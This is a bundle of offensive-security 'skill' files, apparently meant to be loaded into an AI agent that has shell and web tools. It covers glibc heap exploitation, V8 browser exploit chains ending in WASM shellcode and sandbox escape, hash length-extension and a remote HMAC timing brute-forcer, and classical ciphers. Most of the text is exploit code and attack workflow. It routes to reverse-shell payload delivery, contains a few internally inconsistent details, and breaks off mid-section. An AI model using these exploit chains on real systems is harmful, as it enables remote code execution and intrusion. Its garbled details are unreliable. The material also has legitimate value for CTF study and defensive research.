---
name: ctf-techniques
description: Heap exploitation techniques — tcache poisoning, fastbin dup, house of techniques (House of Force/Spirit/Orange/Apple/Cat), unsafe unlink, off-by-one, overlapping chunks, and heap grooming. Organized by technique with glibc version compatibility. Pairs with arbitrary-write-to-rce for final exploitation.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Heap Exploitation — Expert Playbook

> **AI LOAD INSTRUCTION**: Heap exploitation achieves arbitrary read/write primitives via ptmalloc internals. Covers all major techniques from tcache poisoning to House of Apple/Cat. Each technique produces an arbitrary write primitive — pair with arbitrary-write-to-rce for final exploitation. Base models often target techniques that were patched in the specific glibc version being tested.

## 0. RELATED ROUTING

- arbitrary-write-to-rce — once you have arbitrary write, use this to achieve code execution
- reverse-shell-techniques — final payload delivery after RCE

---

## 1. TECHNIQUE SELECTION BY GLIBC VERSION

| Technique | glibc < 2.26 | 2.26–2.29 | 2.30–2.33 | ≥ 2.34 |
|---|---|---|---|---|
| tcache poisoning | No tcache | OK | OK (with safe-linking bypass) | OK (safe-linking required) |
| Fastbin dup | OK | OK (tcache preferred) | Restricted | Restricted |
| Unsafe unlink | OK (no check) | Patched | Patched | Patched |
| Smallbin corruption | OK | OK | OK | OK |
| Largebin attack | OK | OK | OK | OK (popular post-2.34) |
| House of Force | OK | OK (top chunk size check weak) | Harder | Patched |
| House of Spirit | OK | OK | OK | OK (harder) |
| House of Orange | OK | OK (file struct needed) | OK | Harder |
| House of Apple 2 | N/A | N/A | Partial | OK (primary post-2.34) |
| House of Cat | N/A | N/A | N/A | OK (primary post-2.34) |

---

## 2. TCACHE POISONING

**Precondition**: glibc ≥ 2.26, UAF or double-free in tcache range (< 0x408 bytes), overwrite tcache `fd` pointer.

### Basic Tcache Poisoning

```python
# 1. Free a tcache chunk (goes to tcache bin)
free(chunk_A)  # tcache[size]: A → NULL

# 2. UAF: overwrite fd pointer of freed chunk
write_at(chunk_A.fd_offset, target_address)
# tcache[size]: A → target_addr → ...

# 3. Allocate twice — second allocation returns target_address
chunk_X = malloc(size)  # Returns chunk_A
chunk_Y = malloc(size)  # Returns target_address → arbitrary write here
```

### Safe-Linking Bypass (glibc ≥ 2.32)

glibc 2.32+ mangles the `fd` pointer in tcache with `PROTECT_PTR`:

```c
// Stored fd = (heap_address >> 12) ^ actual_fd
// To bypass: need to know heap base address (leak required first)
```

```python
# Compute mangled pointer:
def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

# If you know heap base:
heap_key = heap_base >> 12
mangled_target = heap_key ^ target_address

# Write mangled_target to freed chunk's fd:
write_at(freed_chunk, mangled_target)
```

---

## 3. FASTBIN DUP / DOUBLE-FREE

**Precondition**: double-free in fastbin range (< 0x80 bytes, pre-tcache or with tcache full).

```python
# 1. Allocate three chunks of same fastbin size
a = malloc(0x40)
b = malloc(0x40)

# 2. Free a, then b, then a again (double-free bypass fd check)
free(a)   # fastbin: a → NULL
free(b)   # fastbin: b → a
free(a)   # fastbin: a → b → a (loop!)
# Note: free(a); free(a); immediately triggers double-free error
# Need to free something else in between

# 3. Allocate three times:
p1 = malloc(0x40)  # Returns a
p2 = malloc(0x40)  # Returns b
# Now write target address into p1's fd field:
write_at(p1, target_address)
p3 = malloc(0x40)  # Returns a again
p4 = malloc(0x40)  # Returns target_address → arbitrary write
```

---

## 4. UNSAFE UNLINK (glibc < 2.3.4)

**Precondition**: heap overflow into next chunk's `bk`/`fd` pointers.

```python
# Classic: modify freed chunk's fd/bk to create fake chunk
# When chunk is unlinked:
# fd->bk = bk
# bk->fd = fd
# → Arbitrary write: write `fd` to `bk+0x10` and `bk` to `fd+0x8`

# Modern bypass using fake chunk that passes size check:
# fd = &target - 3 (where target is a 64-bit pointer)
# bk = target_value
```

---

## 5. HOUSE OF FORCE (glibc < 2.29)

**Precondition**: overflow into top chunk header, control `malloc(size)` argument.

```python
# 1. Overflow to set top chunk size to 0xFFFFFFFFFFFFFFFF
overwrite_top_chunk_size(0xFFFFFFFFFFFFFFFF)

# 2. Request large allocation to move top chunk to target - 0x10:
distance = target_address - (top_chunk_ptr + 0x10)
malloc(distance - malloc_overhead)  # This "allocates" the gap

# 3. Next malloc returns target_address:
evil_chunk = malloc(size)  # Returns target address → arbitrary write
```

---

## 6. HOUSE OF SPIRIT

**Precondition**: control a pointer that gets freed, can write fake chunk headers near it.

```python
# 1. Create fake fastbin chunk with correct size/flags
# At fake_addr:
write64(fake_addr, 0)                          # prev_size
write64(fake_addr + 8, 0x40 | 0x1)           # size (must match fastbin, PREV_INUSE set)
write64(fake_addr + 0x40, 0)                   # next chunk prev_size  
write64(fake_addr + 0x48, 0x20 | 0x1)         # next chunk size (must be valid)

# 2. Free the fake chunk:
free(fake_addr + 0x10)  # ptr must point past headers

# 3. Allocate from fastbin → returns fake_addr + 0x10:
controlled_region = malloc(0x38)  # Returns our fake chunk area
```

---

## 7. LARGEBIN ATTACK

**Precondition**: heap overflow/UAF to corrupt largebin chunk's `bk_nextsize` pointer.

```python
# Corrupting bk_nextsize allows writing a heap address to arbitrary location:
# When a small chunk is inserted into largebin:
# victim->bk_nextsize->fd_nextsize = victim

# 1. Free a large chunk (goes to unsortedbin, then largebin on next malloc)
large_chunk = malloc(0x500)
free(large_chunk)

# 2. Trigger sorting by allocating different size:
small = malloc(0x10)

# 3. Corrupt bk_nextsize:
overwrite(large_chunk + 0x20, target_addr - 0x20)
# (target_addr - 0x20 because victim is written to fd_nextsize offset +0x20)

# 4. Allocate another large chunk (triggers insertion → arbitrary write):
trigger = malloc(0x510)
# target_addr now contains a heap address → often used to overwrite _IO_list_all
```

---

## 8. HOUSE OF APPLE 2 / HOUSE OF CAT (Post glibc 2.34)

Both techniques abuse the `_IO_FILE` structure via FSOP (Fake Struct-Oriented Programming).

### Core Idea

```python
# 1. Corrupt _IO_list_all to point to a fake FILE structure
# 2. Craft fake FILE with controlled _wide_data->_wide_vtable
# 3. Trigger exit() / abort() / flush via malloc error
# 4. The vtable call chain leads to __malloc_hook equivalent behavior
```

### House of Apple 2

```c
// _IO_wfile_overflow is called, which accesses:
// fp->_wide_data->_wide_vtable->__overflow
// Control _wide_data and _wide_vtable → arbitrary function call

// Key craft:
fake_wide_data_vtable[3] = one_gadget;  // __overflow offset
fake_file._wide_data = &fake_wide_data;
fake_wide_data._wide_vtable = &fake_wide_data_vtable;
```

---

## 9. HEAP GROOMING TECHNIQUES

```python
# Control heap layout to place chunks at desired positions

# Fill tcache bins (to force chunks into fastbin/smallbin):
chunks = [malloc(0x50) for _ in range(7)]  # Fill tcache[0x50]
for c in chunks:
    free(c)  # All 7 go to tcache, 8th goes to fastbin

# Create memory gaps:
# malloc, malloc (target), malloc (gap), free(gap) → consolidation
# malloc, free, malloc(larger) → absorbs freed gap + extends
```

---

## 10. EXPLOITATION DECISION TREE

```
Bug type?
├── Use-after-free (UAF)?
│   ├── tcache range (< 0x408)? → Tcache poisoning
│   ├── fastbin range (< 0x80)? → Fastbin dup
│   └── Any size + glibc ≥ 2.34? → Largebin attack or House of Apple/Cat
│
├── Double-free?
│   ├── tcache range? → Tcache poisoning (same as UAF)
│   └── fastbin range, tcache full? → Fastbin dup
│
├── Heap overflow?
│   ├── Overflow into top chunk? → House of Force (< 2.29)
│   ├── Overflow into next chunk header? → Unsafe unlink (< 2.34)
│   │   Or fake overlapping chunk
│   └── Partial overflow (1 byte = off-by-one)?
│       └── Null byte overflow → prev_size manipulation
│
├── Control free() on arbitrary pointer?
│   └── House of Spirit
│
└── Post glibc 2.34 (no hooks)?
    ├── Largebin attack → target _IO_list_all, mp_, or global_max_fast
    └── House of Apple 2 / House of Cat → FSOP via _IO_wfile path
```



---

## browser-exploitation-v8

# SKILL: Browser Exploitation — V8 Engine Expert Playbook

> **AI LOAD INSTRUCTION**: V8 exploitation chains together memory corruption in the JS engine to achieve arbitrary code execution inside the Chromium renderer, then escapes the sandbox. Focus: establish addrOf/fakeObj primitives → build arbitrary read/write → control RIP → sandbox escape. Base models often skip: (1) the GC-safe approach to stabilizing primitives, (2) how JIT compilation creates exploitable code paths, (3) Chromium sandbox escape post-exploitation.

## 0. RELATED ROUTING

- heap-exploitation — same primitives pattern (arb read/write → code exec)
- arbitrary-write-to-rce — once arbitrary write is established

---

## 1. V8 BUG CLASSES

### 1.1 Type Confusion (JIT)

The JIT compiler makes type assumptions for optimization. If those assumptions are wrong (via deoptimization, side effects, or incorrect type feedback), memory is accessed as the wrong type.

```javascript
// Classic: array type confusion
function f(a) {
    return a[0] + 1;  // JIT assumes: 'a' is always PACKED_SMI_ELEMENTS
}

// If attacker can change element type between calls:
var arr = [1, 2, 3];         // PACKED_SMI_ELEMENTS
f(arr); f(arr); f(arr);      // JIT compiles assuming SMI
arr[0] = {};                  // Trigger type change
f(arr);                       // JIT uses SMI assumption → type confusion
```

### 1.2 Out-of-Bounds (OOB) Read/Write

```javascript
// Triggered via JIT compiler optimistically skipping bounds checks
// Or via incorrect length tracking in optimized code

function oob(arr) {
    return arr[arr.length];  // JIT may remove bounds check in tight loop
}

// Often combined with:
// - Incorrect handling of holes in sparse arrays
// - Side effects in length property getter
// - Symbol.iterator manipulation
```

### 1.3 Use-After-Free (GC-triggered)

```javascript
// Object freed during GC but reference remains accessible
// Triggered via:
// - Weak references
// - finalizer callbacks
// - Embedding API misuse (when V8 is embedded)
```

### 1.4 Integer Overflow in Array Length

```javascript
// Craft array with overflowed length → massive OOB access
// Common in: Array.prototype.concat, TypedArray constructors
// Example: new Int32Array(0xFFFFFFFF) → may not allocate expected size
```

---

## 2. JAVASCRIPT EXPLOIT PRIMITIVES

The standard V8 exploit primitive setup:

### addrOf — Get Address of JS Object

```javascript
// Using float64 array overlapping with object reference slot:
let float_arr = new Float64Array(1);
let obj_arr = [{}];

// Using DataView on shared backing store (after OOB write to corrupt length):
// 1. Create a float array and an object array adjacent in memory
// 2. Use OOB write on float array to corrupt obj_arr's backing store
// 3. Write known double value, check where it appears as an object pointer
```

### fakeObj — Create Object at Arbitrary Address

```javascript
// Reverse of addrOf:
// 1. Write a crafted object header at target address (using arbitrary write)
// 2. Use type confusion to make V8 treat the memory location as a JS object
// 3. Access properties of fakeObj → reads/writes at that address
```

### Standard Exploit Skeleton

```javascript
// Step 1: Trigger the bug to get OOB read/write on a typed array
// Step 2: Use OOB to corrupt a second typed array's length → "unlimited" array
// Step 3: Implement addrOf using the corrupted array
// Step 4: Implement fakeObj using the corrupted array
// Step 5: Build arbitrary read/write using fake DataView
// Step 6: RIP control via WebAssembly rwx page or JIT code

// DataView for arbitrary read:
function arb_read(addr) {
    let fake = fakeObj(addr - 0x10n);  // DataView internal offset
    let dv = new DataView(fake);
    return dv.getBigUint64(0, true);
}

function arb_write(addr, value) {
    let fake = fakeObj(addr - 0x10n);
    let dv = new DataView(fake);
    dv.setBigUint64(0, value, true);
}
```

---

## 3. V8 OBJECT REPRESENTATION

Understanding V8 heap layout is essential:

```
SMI (Small Integer): stored as (value << 1) | 0, NOT a pointer
Heap Object Pointer: (address | 1), tagged pointer (bit 0 = 1)
HeapNumber: boxed double, 2 words (map pointer + double value)
JSArray: [map, properties, elements, length]
JSObject: [map, properties, elements, ...fields]
FixedArray: [map, length, element0, element1, ...]
```

### V8 Pointer Compression (V8 ≥ 9.0, Chrome ≥ 90)

```
Pointers are compressed to 32-bit in a 4GB heap cage
Full 64-bit pointer = heap_base + compressed_ptr
To dereference: need to know V8 heap base
```

---

## 4. WEBASSEMBLY RWX PAGE (CODE EXEC)

```javascript
// WASM provides an rwx (read-write-execute) page — ideal for shellcode

// 1. Create a WASM module:
const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d,  // magic: \0asm
    0x01, 0x00, 0x00, 0x00,  // version: 1
    // ... minimal wasm module with one exported function
]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_inst = new WebAssembly.Instance(wasm_mod);

// 2. Find the rwx page address using addrOf + arb_read chain:
let f = wasm_inst.exports.main;  // exported function
let f_addr = addrOf(f);
// Walk the internal V8 JSFunction structures to find the WASM code page
// JSFunction → WasmExportedFunctionData → instance → imported_mutable_globals
// → code body pointer → rwx page

// 3. Overwrite rwx page with shellcode:
let shellcode = new Uint8Array([0x48, 0x31, 0xc0, ...]);  // calc.exe / cmd shell
for (let i = 0; i < shellcode.length; i++) {
    arb_write(rwx_base + BigInt(i), shellcode[i]);
}

// 4. Call the function → executes shellcode:
f();
```

---

## 5. CHROME SANDBOX ESCAPE

After renderer RCE, the renderer process is sandboxed. Sandbox escape requires a second vulnerability.

### Common Escape Vectors

```
1. IPC-based bugs (Mojo bindings):
   - Mojo is Chromium's IPC; privileged interfaces exposed to renderer
   - Type confusion in Mojo message handling
   - Use-after-free in Mojo pipes
   
2. GPU process exploitation:
   - GPU process has less restriction than renderer
   - WebGL / command buffer bugs

3. Browser kernel bugs:
   - browser process (privileged) processes renderer messages
   - Logic errors in message handlers

4. Extension APIs:
   - If extension with elevated permissions installed
   - Extension messaging bridge misuse
```

---

## 6. CTF V8 EXPLOITATION WORKFLOW

```bash
# 1. Build V8 (for CTF challenges with custom patch):
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=$PATH:/path/to/depot_tools
fetch v8
cd v8
git checkout <specific_commit>
# Apply CTF patch
./tools/dev/gm.py x64.debug

# 2. Run with debugging:
./d8 --allow-natives-syntax exploit.js

# 3. Useful debugging functions (--allow-natives-syntax):
%DebugPrint(obj)     # Print object info including address
%SystemBreak()       # Trigger debugger break
%HeapObjectVerify(obj)  # Verify heap object integrity
```

### CTF Common Pattern

```javascript
// Most CTF V8 challenges:
// 1. OOB bug is given (via patch diff)
// 2. Build addrOf/fakeObj using OOB
// 3. Fake a DataView for arb read/write
// 4. Find WASM rwx page
// 5. Write shellcode, call it

// Quick addrOf via float array overlap:
var float64 = new Float64Array(1);
var uint32 = new Uint32Array(float64.buffer);

function f2i(f) {  // float64 to BigInt
    float64[0] = f;
    return BigInt(uint32[1]) * 0x100000000n + BigInt(uint32[0]);
}

function i2f(i) {  // BigInt to float64
    uint32[0] = Number(i & 0xFFFFFFFFn);
    uint32[1] = Number(i >> 32n);
    return float64[0];
}
```

---

## 7. BUG DISCOVERY TECHNIQUES

```
Fuzzing:
- fuzzilli: coverage-guided JS engine fuzzer (designed for V8/SpiderMonkey)
  https://github.com/googleprojectzero/fuzzilli
- DIE: differential fuzzing against multiple engines

Code auditing:
- Look for: type feedback invalidation paths
- Deoptimization handling (Deoptimizer::DeoptimizeAll)
- Array length validation in optimized code
- GC root tracking after safepoints

CVE patterns to study:
- CVE-2021-21224: incorrect JIT compiler optimization, type confusion
- CVE-2020-6418: type confusion via side-effect in for-in loop
- CVE-2021-30632: OOB write in V8's JSArray::SetLengthWouldOverflow
```

## From hack-skills: V8 Exploitation Primitives & Sandbox

### addrof + fakeobj Primitive Pattern

```javascript
// addrof: leak object address via PACKED_ELEMENTS ↔ PACKED_DOUBLE_ELEMENTS confusion
function addrof(obj) {
    // Trigger type confusion so array reads obj ref as float
    object_array[0] = obj;
    return ftoi(confused_float_array[0]);  // float bits = compressed pointer
}

// fakeobj: reverse — write float (raw pointer bits) → read as object reference
function fakeobj(addr) {
    confused_float_array[0] = itof(addr);
    return object_array[0];  // now a "pointer" to addr
}

// Build arbitrary R/W from addrof + fakeobj:
let rw_array = new Float64Array(0x100);
let rw_array_addr = addrof(rw_array);
// Fake a Float64Array at controlled address with modified backing_store
// Corrupt backing_store pointer to target address
// Read/write through the fake Float64Array → arbitrary R/W

function read64(addr) {
    write_to_fake_backingstore(addr);
    return fake_float64array[0];
}
function write64(addr, value) {
    write_to_fake_backingstore(addr);
    fake_float64array[0] = value;
}
```

### V8 Sandbox Architecture (V8 ≥ 11.x)

```
Process Virtual Address Space:
┌──────────────────────────────────────┐
│  V8 Sandbox Cage (4GB region)        │
│  ├── V8 Heap (JS objects)            │
│  ├── ArrayBuffer backing stores      │
│  ├── WASM memory                     │
│  └── External pointer table          │
├──────────────────────────────────────┤
│  Process memory outside cage         │
│  ├── libc, Chrome code               │
│  ├── Stack                           │
│  └── Other allocations               │
└──────────────────────────────────────┘
```

**Key impact**: since V8 ≥ 8.0, ArrayBuffer.backing_store is a **sandbox pointer** (within the V8 cage). Cannot directly point outside the V8 cage — need sandbox escape for full process memory access.

### Sandbox Escape Vectors

| Vector | Method |
|---|---|
| External pointer table | Corrupt entries to reference arbitrary addresses |
| WASM code pointer | Overwrite WASM function entry to jump to controlled shellcode |
| JIT code corruption | Write to JIT code page via race condition or confused pointer |
| Mojo IPC (Chrome) | UAF or type confusion in Mojo message handlers |
| Backing store seal bypass | Type confusion to get unsandboxed pointer |

### Chrome Renderer → Browser Process Escape

| Stage | Target | Example |
|---|---|---|
| Renderer exploit | V8 / Blink DOM | Type confusion → shellcode in renderer |
| IPC/Mojo bug | Chrome IPC layer | UAF in Mojo interface |
| Browser process exploit | Privileged browser process | Full code execution outside sandbox |

### WASM RWX Page Exploitation

```javascript
let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, ...]);
let mod = new WebAssembly.Module(wasm_code);
let instance = new WebAssembly.Instance(mod);
// instance.exports.func → points to RWX page (older V8) or RX page (modern)

// Exploit chain:
// 1. addrof(instance) → find WASM instance object
// 2. Follow pointers: instance → jump_table_start → RWX page
// 3. Use arbitrary write to overwrite RWX page with shellcode
// 4. Call instance.exports.func() → executes shellcode
```

**Modern Chrome**: W^X enforcement — JIT code written in RW mode, then switched to RX. Exploitation requires finding a write window or using JIT spray.



---

## hash-attack-techniques

# SKILL: Hash Attack Techniques — Expert Playbook

> **AI LOAD INSTRUCTION**: Covers all major cryptographic hash attacks: length extension, MD5/SHA-1 collision generation, birthday attack theory, HMAC timing oracle, meet-in-the-middle, and PoW solving. Base models often describe length extension conceptually without providing the actual HashPump/hash_extender tool commands, and miss the PoW solving patterns common in CTF challenges.

## 0. RELATED ROUTING

- jwt-cracker — if the target is JWT HMAC signing
- deserialization — many deserialization formats use weak hash-based signatures

---

## 1. HASH LENGTH EXTENSION ATTACK

### When to Apply

Target is using `hash(secret + message)` construction (NOT HMAC). Common in:
- Cookie signing: `SHA256(secret_key + cookie_data)`
- API signatures: `MD5(api_secret + request_params)`
- File integrity: `SHA1(salt + filename)`

### How It Works

SHA-1, SHA-256, SHA-512, and MD5 all use Merkle-Damgård construction. Given `H(secret + data)`, you can compute `H(secret + data + padding + append)` without knowing the secret.

The original hash state leaks the internal state after processing `secret + data`, which you can resume from.

### Tool: HashPump

```bash
# Install:
git clone https://github.com/bwall/HashPump
cd HashPump && make

# Usage:
# hashpump -s <signature> -d <known_data> -a <data_to_append> -k <key_length>
hashpump -s "2c624232cdd221771294dfbb310acbc2" \
         -d "count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo" \
         -a "&waffle=liege" \
         -k 14

# Output:
# New signature: <new_hash>
# New data: count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\x80\x00...<padding>&waffle=liege
```

### Tool: hash_extender

```bash
# More flexible, supports MD5/SHA-1/SHA-256/SHA-512
./hash_extender \
  --data "count=10&user_id=1" \
  --secret-min-length 8 \
  --secret-max-length 20 \
  --append "&admin=true" \
  --signature "aabbcc..." \
  --format sha256
```

### Python Implementation (SHA-256 length extension)

```python
from hashpumpy import hashpump
# pip install hashpumpy

old_sig = "2c624232cdd221771294dfbb310acbc2"
old_data = "count=10&user_id=1"
append_data = "&admin=true"
key_length = 14  # brute-force if unknown (try 1-50)

new_sig, new_data = hashpump(old_sig, old_data, append_data, key_length)
print(f"New sig: {new_sig}")
print(f"New data (hex): {new_data.hex()}")
```

---

## 2. MD5 COLLISION ATTACK

### fastcoll (Fast MD5 Collision Generator)

Generates two different files with the same MD5 hash in seconds.

```bash
# Install: download binary from https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5-1.zip

# Generate collision pair with shared prefix:
fastcoll -p prefix.bin -o collision1.bin collision2.bin

# Verify:
md5sum collision1.bin collision2.bin
# Both should have the same MD5
```

### Use Cases

- Bypass MD5-based file integrity checks
- Hash collision in digital certificate CN (historical)
- CTF challenges: produce file A and file B with same MD5 but different content

### hashclash (Chosen-prefix MD5 collision)

```bash
# Chosen-prefix: given two arbitrary prefixes P1 and P2,
# compute suffixes S1 and S2 such that MD5(P1+S1) == MD5(P2+S2)
# More powerful: both files can have different, meaningful content

# Project: https://github.com/cr-marcstevens/hashclash
# Takes longer (hours to days) but produces meaningful collisions
```

---

## 3. SHA-1 COLLISION (SHATTERED)

The SHAttered attack (Google/CWI, 2017) demonstrates the first practical SHA-1 collision.

```bash
# Download the two shattered files:
# https://shattered.io/static/shattered-1.pdf and shattered-2.pdf

sha1sum shattered-1.pdf shattered-2.pdf
# Both: 38762cf7f55934b34d179ae6a4c80cadccbb7f0a

# Generate custom SHA-1 collisions:
# Tool: sha1collisiondetection and attack tools from shattered.io
# Practical collision generation takes ~6500 GPU-years on CPU, seconds on specialized hardware
```

### Practical Impact

- Git uses SHA-1 → two commits with same SHA-1 hash possible
- Document signing with SHA-1 → two documents with identical signatures
- TLS certificate fingerprinting

---

## 4. BIRTHDAY ATTACK (PROBABILITY)

For an n-bit hash, a birthday collision requires approximately 2^(n/2) attempts.

| Hash | Bits | Birthday Collision Attempts |
|---|---|---|
| MD5 | 128 | ~2^64 ≈ 1.8 × 10^19 |
| SHA-1 | 160 | ~2^80 |
| SHA-256 | 256 | ~2^128 |
| CRC32 | 32 | ~2^16 = 65536 |

### Session Token Birthday Attack

If session tokens are 64 bits, birthday collision at ~2^32 = 4 billion tokens:

```python
import hashlib, random, string

# Generate random session tokens and check for collisions
tokens = {}
attempts = 0

while True:
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    h = hashlib.md5(token.encode()).hexdigest()[:8]  # 32-bit truncated
    
    if h in tokens:
        print(f"Collision found after {attempts} attempts!")
        print(f"Token 1: {tokens[h]}, Token 2: {token}")
        break
    
    tokens[h] = token
    attempts += 1
```

---

## 5. HMAC TIMING ORACLE

If HMAC comparison is done without constant-time comparison, timing differences leak hash validity.

### Vulnerable Pattern

```python
# VULNERABLE: early return on first mismatch
def verify(msg, sig, secret):
    expected = hmac.new(secret, msg)
    return expected.digest() == sig  # Python == does byte-by-byte comparison (may short-circuit)
```

### Timing Attack (Remote)

```python
import hmac, hashlib, time, requests

def measure_time(payload, signature):
    start = time.perf_counter()
    r = requests.post('/api/verify', 
                      json={'data': payload, 'sig': signature},
                      timeout=5)
    return time.perf_counter() - start

# Brute-force signature byte by byte using timing
def brute_force_hmac(payload, known_prefix=""):
    best_char = None
    best_time = 0
    
    for c in range(256):
        candidate = known_prefix + chr(c) + "\x00" * (32 - len(known_prefix) - 1)
        t = measure_time(payload, candidate)
        if t > best_time:
            best_time = t
            best_char = chr(c)
    
    return known_prefix + best_char
```

### Safe Comparison

```python
# SAFE: constant-time comparison
import hmac
hmac.compare_digest(computed_signature, provided_signature)
```

---

## 6. MEET-IN-THE-MIDDLE ATTACK

Applies when hashing is done in two stages: `hash2(hash1(data))` with two separate secrets.

```
hash(key1, hash(key2, data))
```

**Strategy**:
1. For all possible key2: compute `H2 = hash(key2, data)` → store in table
2. For all possible key1: compute `H1 = hash(key1, target_hash)` → check if H1 is in table
3. Collision between H1 and H2 gives both keys

Reduces brute-force from O(2^n × 2^m) to O(2^n + 2^m).

```python
# Double-DES meet-in-the-middle example:
# Total keyspace: 2^112 for brute force
# MITM: 2^56 + 2^56 = 2^57 operations
```

---

## 7. HASH IDENTIFICATION

```bash
# hashid tool
hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"
# Output: MD5, MD4, Double MD5...

# hashcat hash format detection
hashcat --identify hash.txt

# Common hash lengths:
# 32 hex chars = MD5 (128 bits)
# 40 hex chars = SHA-1 (160 bits)
# 56 hex chars = SHA-224 (224 bits)
# 64 hex chars = SHA-256 (256 bits)
# 96 hex chars = SHA-384 (384 bits)
# 128 hex chars = SHA-512 (512 bits)
# $2b$...60chars = bcrypt
# $1$...$...  = MD5crypt
# $6$...$...  = SHA-512crypt
```

---

## 8. PROOF-OF-WORK (PoW) SOLVING

Common in CTF challenges and anti-spam mechanisms.

### Hashcash Style PoW

```python
import hashlib, itertools, string

def solve_pow(prefix, difficulty=4):
    """Find X such that SHA256(prefix + X) starts with '0' * difficulty"""
    target = "0" * difficulty
    
    for i in itertools.count():
        candidate = prefix + str(i)
        h = hashlib.sha256(candidate.encode()).hexdigest()
        if h.startswith(target):
            print(f"Solution: {candidate}, Hash: {h}")
            return str(i)

solve_pow("RANDOMPREFIX", difficulty=5)
```

### Partial Preimage PoW

```python
import hashlib

def solve_pow_partial(prefix, target_suffix):
    """Find X such that MD5(prefix + X) ends with target_suffix"""
    for i in range(10**8):
        h = hashlib.md5(f"{prefix}{i}".encode()).hexdigest()
        if h.endswith(target_suffix):
            return i
    return None
```

---

## 9. ATTACK SELECTION DECISION TREE

```
Hash-based protection found?
├── What construction is it?
│   ├── H(secret + message) → LENGTH EXTENSION ATTACK
│   │   └── Use HashPump or hash_extender
│   ├── HMAC(secret, message) → TIMING ORACLE (remote)
│   │   └── Measure response time for each candidate byte
│   ├── H(H(key2, data), key1) → MEET-IN-THE-MIDDLE
│   │   └── Build precomputed table for one key, test against second
│   └── MD5/SHA-1 file fingerprint → COLLISION
│       ├── MD5: use fastcoll (seconds)
│       └── SHA-1: use shattered (practical, requires setup)
│
├── Hash collision needed?
│   ├── MD5: fastcoll → collision pair in <1 second
│   ├── SHA-1: SHAttered project tools (~6500 GPU-years naive, faster with modern hardware)
│   └── SHA-256+: not practically feasible (use different approach)
│
├── PoW challenge?
│   ├── Hashcash (find X where H(prefix+X) starts with 0s): counter brute-force
│   └── Custom PoW: analyze challenge, pick matching solver
│
└── Hash cracking (preimage)?
    └── Use hashcat with appropriate mode: -m 0 (MD5), -m 100 (SHA-1), etc.
```



---

## classical-cipher-analysis

# SKILL: Classical Cipher Analysis — Identification & Cryptanalysis

> **AI LOAD INSTRUCTION**: Classical ciphers appear frequently in CTF challenges. Covers identification techniques (letter frequency, digrams, keyword patterns), automated analysis tools, and manual cryptanalysis workflows for all major cipher types. Base models often skip the identification step and jump to wrong cipher type, or miss that text may be base64/hex encoded before the cipher is applied.

## 0. RELATED ROUTING

- steganography-techniques — cipher text may be hidden in steganographic media
- hash-attack-techniques — if the "cipher" is actually a hash function

---

## 1. IDENTIFICATION WORKFLOW

```
Received ciphertext → Analyze:
1. Character set? (A-Z only? hex? base64? mixed?)
2. All caps / lowercase? (may indicate specific cipher)
3. Spaces preserved? (usually preserved in classical ciphers)
4. Length statistics (letter frequencies)
5. Try online tools: quipqiup.com, cryptoclub.org, dcode.fr
```

### Character Set Clues

| Character Set | Likely Encoding/Cipher |
|---|---|
| `0-9, A-F` only | Hex encoded — decode first |
| `A-Za-z0-9+/=` | Base64 — decode first |
| `A-Z` only, 25-char freq dist | Substitution cipher |
| Numbers only | Baconian, Polybius, or simple number-to-letter |
| `[`, `]`, `.`, `,` | Brainfuck, ook!, or other esoteric languages |
| Binary (`0` and `1`) | Binary encoding, Baudot, Morse |
| Symbols only | Symbol substitution (Wingdings, etc.) |

---

## 2. CAESAR CIPHER / ROT-13

**Identification**: single-shift substitution, same frequency distribution as plaintext, uniform character mapping.

### Brute Force

```python
def caesar_brute(ciphertext):
    for shift in range(1, 26):
        decoded = ""
        for c in ciphertext:
            if c.isalpha():
                offset = 65 if c.isupper() else 97
                decoded += chr((ord(c) - offset - shift) % 26 + offset)
            else:
                decoded += c
        print(f"Shift {shift:2d}: {decoded[:60]}")

caesar_brute("KHOOR ZRUOG")
```

### ROT-13 (Special Case: shift=13)

```python
import codecs
print(codecs.encode("URYYB JBEYQ", 'rot_13'))  # → HELLO WORLD

# Bash:
echo "URYYB JBEYQ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## 3. VIGENÈRE CIPHER

**Identification**: repeating key, frequency distribution closer to flat (more uniform than Caesar).

### Kasiski Test (Find Key Length)

```python
def find_key_length_kasiski(ciphertext, min_len=3, max_len=5):
    # Find repeated trigrams and their distances
    ciphertext = ciphertext.replace(" ", "").upper()
    distances = []
    
    for size in range(min_len, max_len + 1):
        for i in range(len(ciphertext) - size):
            gram = ciphertext[i:i+size]
            for j in range(i+size, len(ciphertext) - size):
                if ciphertext[j:j+size] == gram:
                    distances.append(j - i)
    
    # Find GCD of distances → likely key length
    from math import gcd
    from functools import reduce
    if distances:
        key_len = reduce(gcd, distances)
        print(f"Likely key length: {key_len}")
        print(f"All distances: {distances[:10]}")
```

### Index of Coincidence (IC)

```python
def index_of_coincidence(text):
    text = ''.join(c for c in text.upper() if c.isalpha())
    n = len(text)
    if n < 2: return 0
    freq = [text.count(chr(i + 65)) for i in range(26)]
    return sum(f * (f - 1) for f in freq) / (n * (n - 1))
# IC ≈ 0.065 → English plaintext (monoalphabetic cipher)
# IC ≈ 0.038 → random / polyalphabetic
```

### Vigenère Decryption (Known Key)

```python
def vigenere_decrypt(ciphertext, key):
    key = key.upper()
    result = []
    ki = 0
    for c in ciphertext.upper():
        if c.isalpha():
            shift = ord(key[ki % len(key)]) - 65
            result.append(chr((ord(c) - 65 - shift) % 26 + 65))
            ki += 1
        else:
            result.append(c)
    return ''.join(result)
```

### Automated Tools

```bash
# Online: www.dcode.fr/vigenere-cipher (auto key length detection)
# quipqiup.com (monoalphabetic)

# Python: pycipher
pip install pycipher
python3 -c "import pycipher; print(pycipher.Vigenere('KEY').decipher('CIPHERTEXT'))"
```

---

## 4. MONOALPHABETIC SUBSTITUTION

**Identification**: 26 unique letter mapping, same frequency distribution as English but shifted/replaced.

### Frequency Analysis

```python
